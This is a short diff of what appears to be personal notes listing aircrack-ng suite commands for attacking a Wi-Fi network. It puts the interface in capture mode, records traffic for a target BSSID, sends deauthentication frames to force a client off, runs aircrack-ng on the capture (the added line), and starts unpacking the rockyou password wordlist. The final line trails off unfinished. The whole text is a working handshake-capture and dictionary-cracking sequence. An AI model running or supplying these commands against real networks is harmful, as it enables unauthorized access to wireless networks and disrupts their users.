@@ -16,7 +16,7 @@ sudo ifconfig wlan0 up
 sudo airodump-ng wlan0
 sudo airodump-ng --bssid aa:bb:cc:dd:ee:ff  --channel 1 --write capture wlan0
 sudo aireplay-ng --deauth 10 -a aa:bb:cc:dd:ee:ff  -c aa:bb:cc:dd:ee:ff  wlan0
-
+aircrack-ng capture.cap
 cd /usr/share/wordlist
 
 sudo gunzip rockyou.tar.gz.... something 
